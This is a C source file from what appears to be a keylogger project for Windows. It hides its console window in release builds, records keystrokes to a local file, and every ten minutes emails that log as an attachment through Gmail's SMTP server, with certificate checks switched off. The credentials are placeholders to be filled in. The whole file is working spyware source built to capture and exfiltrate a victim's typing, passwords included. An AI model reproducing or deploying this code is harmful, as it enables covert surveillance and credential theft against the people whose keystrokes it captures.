/******************************************************************************************************
 * @file key_logger_mail.c                                                                            *
 * @date:      @author:                   Reason for change:                                          *
 * 08.08.2023  Gaina Stefan               Initial version.                                            *
 * @details This file implements the class defined in key_logger_mail.h.                              *
 * @todo N/A.                                                                                         *
 * @bug Stop e-mail is not being sent.                                                                *
 *****************************************************************************************************/

/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <signal.h>
#include <curl/curl.h>
#include <windows.h>

#include "key_logger_mail.h"
#include "key_logger.h"
#include "key_logger_version.h"

/******************************************************************************************************
 * MACROS                                                                                             *
 *****************************************************************************************************/

/**
 * @brief How often will the logger check for new key presses.
*/
#define KEY_LOGGER_FREQUENCY_MILLISECONDS 10UL

/**
 * @brief The name of the file where the keys are written in.
*/
#define LOG_FILE_NAME "key_logs.txt"

/**
 * @brief The e-mail address where the logs will be sent to each 10 minutes (needs to be changed to
 * your e-mail address).
*/
#define ADDRESS "INSERT_YOUR_MAIL"

/**
 * @brief The password for authentification (needs to be changed).
*/
#define PASSWORD "INSERT_YOUR_PASSWORD"

/**
 * @brief The name of the SMTP server (in this case Google).
*/
#define SMTP_SERVER "smtp.gmail.com"

/**
 * @brief The port of the secured protocol.
*/
#define SSL_PORT 465UL

#ifndef DEBUG_BUILD

/**
 * @brief Strip printing from compilation because the console is freed.
*/
#define fprintf(...) 0

#endif /*< DEBUG_BUILD */

/******************************************************************************************************
 * TYPE DEFINITIONS                                                                                   *
 *****************************************************************************************************/

/**
 * @brief Structure encapsulating the data needed to be passed when the callback is called by the key
 * logger.
*/
typedef struct s_CallbackData_t
{
	FILE*     file;           /**< Log file object.                             */
	int32_t   callback_count; /**< How many times has the callback been called. */
} CallbackData_t;

/**
 * @brief Enumerates the types of e-mails that can be sent.
*/
typedef enum e_MailType_t
{
	E_MAIL_TYPE_START  = 0, /**< Sends a message indicating the start of the logger.*/
	E_MAIL_TYPE_STOP   = 1, /**< Sends a message indicating the stop of the logger. */
	E_MAIL_TYPE_UPDATE = 2  /**< Sends the key log file as an attachment.           */
} MailType_t;

/******************************************************************************************************
 * LOCAL FUNCTIONS                                                                                    *
 *****************************************************************************************************/

/**
 * @brief Sends an e-mail with the log file and closes it. The key logger is also stopped.
 * @param[in] data: Address of a variable of type CallbackData_t.
 * @return void
*/
static void on_key_update(void* data);

/**
 * @brief Handler for SIGABRT singal, sending an e-mail that the logging is stopping.
 * @param signal: What signal is being received.
 * @return void
*/
static void signal_handler(int signal);

/**
 * @brief Sends an e-mail.
 * @param mail_type: The type of mail that will be sent.
 * @return true - the mail was sent successfully | false - an error occurred.
*/
static bool send_mail(MailType_t mail_type);

/******************************************************************************************************
 * FUNCTION DEFINITIONS                                                                               *
 *****************************************************************************************************/

bool key_logger_mail_run(void)
{
	CallbackData_t             callback_data = { .file = NULL, .callback_count = 0L };
	const key_logger_Version_t version       = key_logger_get_version();
	CURLcode                   error_code    = CURLE_FAILED_INIT;

	if (KEY_LOGGER_VERSION_MAJOR != version.major
	 || KEY_LOGGER_VERSION_MINOR != version.minor
	 || KEY_LOGGER_VERSION_PATCH != version.patch)
	{
		(void)fprintf(stderr, "Key logger version mismatch!\n");
		return false;
	}

#ifndef DEBUG_BUILD
	if (FALSE == FreeConsole())
	{
		(void)fprintf(stderr, "Failed to free console! (error code: %" PRIu32 ")\n", GetLastError());
		return false;
	}
#endif /*< DEBUG_BUILD */

	error_code = curl_global_init(CURL_GLOBAL_ALL);
	if (CURLE_OK != error_code)
	{
		(void)fprintf(stderr, "Failed to initialize curl! (error code: %" PRId32 ")", error_code);
		return false;
	}

	(void)send_mail(E_MAIL_TYPE_START);

	if (SIG_ERR == signal(SIGABRT, signal_handler))
	{
		(void)fprintf(stderr, "Failed to assign singal handler for SIGABRT!\n");
	}

	do
	{
		callback_data.file = fopen(LOG_FILE_NAME, "w");
		if (NULL == callback_data.file)
		{
			(void)fprintf(stderr, "Failed to open \"" LOG_FILE_NAME "\"!\n");
			curl_global_cleanup();

			return false;
		}
	}
	while (true == key_logger_run_custom(callback_data.file, KEY_LOGGER_FREQUENCY_MILLISECONDS, 150U, on_key_update, &callback_data));

	(void)send_mail(E_MAIL_TYPE_STOP);
	curl_global_cleanup();

	return true;
}

static void on_key_update(void* const data)
{
	CallbackData_t* const callback_data = (CallbackData_t*)data;

	if (NULL == callback_data)
	{
		return;
	}

	if (10L * 60L * (1000L / KEY_LOGGER_FREQUENCY_MILLISECONDS) > ++callback_data->callback_count)
	{
		return;
	}
	callback_data->callback_count = 0L;

	(void)send_mail(E_MAIL_TYPE_UPDATE);

	(void)fclose(callback_data->file);
	callback_data->file = NULL;
	key_logger_stop();
}

static void signal_handler(const int signal)
{
	if (SIGABRT == signal)
	{
		key_logger_stop();
		return;
	}

	(void)fprintf(stdout, "Signal %" PRId32 " ignored!\n", signal);
}

static bool send_mail(const MailType_t mail_type)
{
	char               address[128]   = "";
	char               host_name[64]  = "";
	const char*        headers_text[] = { "Date: Tue, 10 Aug 2023 14:08:43 +0100",
										  "To: <" ADDRESS ">",
										  "From: <" ADDRESS ">",
										  "Subject:",
										  NULL
										};
	const char*        inline_text    = NULL;
	const char**       line           = NULL;
	CURL*              curl           = NULL;
	struct curl_slist* recipients     = NULL;
	struct curl_slist* headers        = NULL;
	struct curl_slist* slist          = NULL;
	curl_mime*         mime           = NULL;
	curl_mime*         alt            = NULL;
	curl_mimepart*     mime_part      = NULL;
	CURLcode           error_code     = CURLE_FAILED_INIT;

	switch (mail_type)
	{
		case E_MAIL_TYPE_START:
		{
			headers_text[3] = "Subject: [Key logs] Start";
			inline_text     = "You will receive updates every 10 minutes!\r\n";
			break;
		}
		case E_MAIL_TYPE_STOP:
		{
			headers_text[3] = "Subject: [Key logs] Stop";
			inline_text     = "You will no longer received updates!\r\n";
			break;
		}
		case E_MAIL_TYPE_UPDATE:
		{
			headers_text[3] = "Subject: [Key logs] Update";
			inline_text     = "Here are you key logs sir!\r\n";
			break;
		}
		default:
		{
			(void)fprintf(stderr, "Invalid mail type! (type: %" PRId32 ")\n", mail_type);
			return false;
		}
	}

	curl = curl_easy_init();
	if (NULL == curl)
	{
		(void)fprintf(stderr, "Failed to initialize curl easy!\n");
		return false;
	}

	if (0L != gethostname(host_name, sizeof(host_name)))
	{
		(void)strncpy(host_name, "localhost", sizeof(host_name));
	}

	(void)snprintf(address, sizeof(address), "smtps://" SMTP_SERVER ":%lu/%s", SSL_PORT, host_name);
	(void)curl_easy_setopt(curl, CURLOPT_URL, address);

	(void)curl_easy_setopt(curl, CURLOPT_USE_SSL, (int)CURLUSESSL_TRY);
	(void)curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
	(void)curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

	(void)curl_easy_setopt(curl, CURLOPT_USERNAME, ADDRESS);
	(void)curl_easy_setopt(curl, CURLOPT_PASSWORD, PASSWORD);
	(void)curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "<" ADDRESS ">");

	recipients = curl_slist_append(recipients, "<" ADDRESS ">");
	if (NULL == recipients)
	{
		(void)fprintf(stderr, "Failed to append recipient!\n");
		goto CLEAN;
	}
	(void)curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

	for (line = headers_text; NULL != *line; ++line)
	{
		headers = curl_slist_append(headers, *line);
		if (NULL == headers)
		{
			(void)fprintf(stderr, "Failed to append headers!\n");
			goto CLEAN;
		}
	}
	(void)curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

	mime = curl_mime_init(curl);
	if (NULL == mime)
	{
		(void)fprintf(stderr, "Failed to initialize mime!\n");
		goto CLEAN;
	}

	alt = curl_mime_init(curl);
	if (NULL == alt)
	{
		(void)fprintf(stderr, "Failed to initialize mime!\n");
		goto CLEAN;
	}

	mime_part = curl_mime_addpart(alt);
	if (NULL == mime_part)
	{
		(void)fprintf(stderr, "Failed to add mime part!\n");
		goto CLEAN;
	}

	error_code = curl_mime_data(mime_part, inline_text, CURL_ZERO_TERMINATED);
	if (CURLE_OK != error_code)
	{
		(void)fprintf(stderr, "Failed to set mime data! (error code: %" PRId32 ")\n", error_code);
		goto CLEAN;
	}

	mime_part = curl_mime_addpart(mime);
	if (NULL == mime_part)
	{
		(void)fprintf(stderr, "Failed to add mime part!\n");
		error_code = CURLE_FAILED_INIT;

		goto CLEAN;
	}

	error_code = curl_mime_subparts(mime_part, alt);
	if (CURLE_OK != error_code)
	{
		(void)fprintf(stderr, "Failed to set mime subparts! (error code: %" PRId32 ")\n", error_code);
		goto CLEAN;
	}

	error_code = curl_mime_type(mime_part, "multipart/alternative");
	if (CURLE_OK != error_code)
	{
		(void)fprintf(stderr, "Failed to set mime part type! (error code: %" PRId32 ")\n", error_code);
		goto CLEAN;
	}

	slist = curl_slist_append(NULL, "Content-Disposition: inline");
	if (NULL == slist)
	{
		goto CLEAN;
	}

	error_code = curl_mime_headers(mime_part, slist, 1L);
	if (CURLE_OK != error_code)
	{
		(void)fprintf(stderr, "Failed to set mime part headers! (error code: %" PRId32 ")\n", error_code);
		curl_slist_free_all(slist);

		goto CLEAN;
	}

	mime_part = curl_mime_addpart(mime);
	if (NULL == mime_part)
	{
		(void)fprintf(stderr, "Failed to add mime part!\n");
		error_code = CURLE_FAILED_INIT;

		goto CLEAN;
	}

	if (E_MAIL_TYPE_UPDATE == mail_type)
	{
		error_code = curl_mime_filedata(mime_part, LOG_FILE_NAME);
		if (CURLE_OK != error_code)
		{
			(void)fprintf(stderr, "Failed to set mime part data source! (error code: %" PRId32 ")\n", error_code);
			goto CLEAN;
		}
	}
	(void)curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

	error_code = curl_easy_perform(curl);

CLEAN:

	curl_slist_free_all(recipients);
	curl_slist_free_all(headers);
	curl_easy_cleanup(curl);
	curl_mime_free(mime);

	return CURLE_OK == error_code ? true : false;
}
